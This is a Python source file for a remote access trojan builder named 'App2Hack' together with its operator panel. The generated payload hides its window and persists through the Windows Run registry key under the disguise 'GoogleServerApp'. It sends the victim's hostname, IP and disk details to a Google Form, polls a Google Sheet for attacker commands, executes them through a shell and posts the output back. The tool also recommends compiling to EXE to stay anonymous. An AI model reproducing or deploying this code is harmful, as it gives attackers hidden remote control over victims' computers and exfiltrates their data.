import os
try:
    import requests
except:
    os.system("python -m pip install requests")
    import requests


def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def download(link,name):
    try:
        file = requests.get(link)
        if file.status_code != 200:
            return False
        f = open(name,"wb")
        f.write(file.content)
        f.close()
        return True
    except:
        pass

def rPost(url, qu1, shell):
    requests.get(url+"/formResponse?"+qu1+shell)





def Rat_App2hack():
    def bnrv():
        print("""

                     ___  _    _            _    
    /\              |__ \| |  | |          | |   
   /  \   _ __  _ __   ) | |__| | __ _  ___| | __
  / /\ \ | '_ \| '_ \ / /|  __  |/ _` |/ __| |/ /
 / ____ \| |_) | |_) / /_| |  | | (_| | (__|   < 
/_/    \_\ .__/| .__/____|_|  |_|\__,_|\___|_|\_\ 
         | |   | |  
         |_|   |_|  





""")
    bnrv()
    zzxs = input("makeing rat  or  open panel hacker (m/o): ")

    if zzxs == 'm' or zzxs == 'M':
        clear_screen()
        bnrv()
        path_rat = input("\n\t Enter   Path + name   For Making Rat: ")
        name_rat = path_rat + ".py"
        clear_screen()
        db_clint = input("\n Enter Your Db Clint <GetLink>(docs.google.com/spreadsheets/u/2/d/11ghWq_7gT_2g8): ")
        clear_screen()
        db_server = input("\n Enter Your Db Server <PostLink>(docs.google.com/forms/d/e/1FAIyujtgn4zbVA): ")
        clear_screen()
        db_but_server = input("\n Enter Your Db Server <PostLink>(docs.google.com/forms/d/e/1FAIyujtgn4zbVA): ")
        clear_screen()
        print(" MAKEING RAT . . .\n\n")

        rat = open(name_rat, "w+")
        rat.write('''
import os, time
import subprocess
try:
    import requests
except:
    os.system("python -m pip install requests")
    import requests
try:
    from win32con import SW_HIDE
    import win32gui
    pid = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(pid , SW_HIDE)
except:
    pass
try:
    import winreg as reg
    key = reg.OpenKey(reg.HKEY_CURRENT_USER , "Software\Microsoft\Windows\CurrentVersion\Run" ,0 , reg.KEY_ALL_ACCESS)
    reg.SetValueEx(key ,"GoogleServerApp" , 0 , reg.REG_SZ , __file__)
    reg.CloseKey(key)
except:
    pass
def download(link,name):
    try:
        file = requests.get(link)
        if file.status_code != 200:
            return False
        f = open(name,"wb")
        f.write(file.content)
        f.close()
        return True
    except:
        pass
def rGet():
    Rat_Link_Get = ("https://'''+str(db_clint)+'''/export?format=csv")
    download(link=Rat_Link_Get,name="rdb.hidn")
def rPost(shell):
    try:
        requests.get("https://'''+str(db_server)+'''/formResponse?'''+db_but_server+'''{}".format(shell))
    except:
        pass
try:
    import socket, shutil
    nms = socket.gethostname()
    ip_system = socket.gethostbyname(nms)
    if os.name == 'nt':
        systemwww = "Windows"
    else:
        systemwww = "Linux"
    try:
        nnn_disk = "C://"
        ds = shutil.disk_usage(nnn_disk)
        dsc = str(ds)
    except:
        dsc = "Error Get!"
    rPost("Hacked!   System Name:{};  Ip:{};  System:{};  DiskInfo:{}".format(nms, ip_system, systemwww, dsc))
except:
    pass
while True:
    time.sleep(30)
    rGet()
    codehackerfile = open("rdb.hidn", "r")
    for codelin in codehackerfile:
        codehacker = codelin.split(",")[1]
        try:
            proc = subprocess.Popen(codehacker , shell=True , stdout=subprocess.PIPE, stderr = subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            rPost(result)
        except:
            pass
    codehackerfile.close()
    try:
        os.remove("rdb.hidn")
    except:
        pass
''')
        rat.close()
        print("\n\n\n  MAKING PROJECT DOWN.")
        print("\n  Convert Python Script To EXE To Stay anonymous And Run On All Platform")
        input("\n\n\n\tEnter for close ")
        clear_screen()



    elif zzxs == 'o' or zzxs == 'O':
        clear_screen()
        bnrv()
        # Get Db server
        print("****server*****")
        db_googl_g = str(input(" Enter Link Get Db Googl(docs.google.com/spreadsheets/d/8ojmi8r2fA): "))
        db_googl_get = (db_googl_g+"/export?format=csv")

        # Get Db clint
        print("\n\n****clint*****")
        db_googl_senc = str(input(" Enter Link Send Db Googl(docs.google.com/forms/d/e/1FAxdt_rxvg_2ACWA): "))
        db_googl_sendc = (db_googl_senc+"/formResponse?")
        db_googl_send_qu1c = str(input(" Enter Link Db(entry.13876560=): "))# for Rat panel
    
        while True:
            try:
                download(link=db_googl_get,name="rdbyjuhgtrf.hidn")
                db_o = open("rdbyjuhgtrf.hidn", "r")
                for lliin in db_o:
                    print(lliin)
                cod = input("$_ ")
                if cod != "":
                    rPost(url=db_googl_senc, qu1=db_googl_send_qu1c, shell=cod)
                db_o.close()
            except:
                pass
    # ==================================================================================        





Rat_App2hack()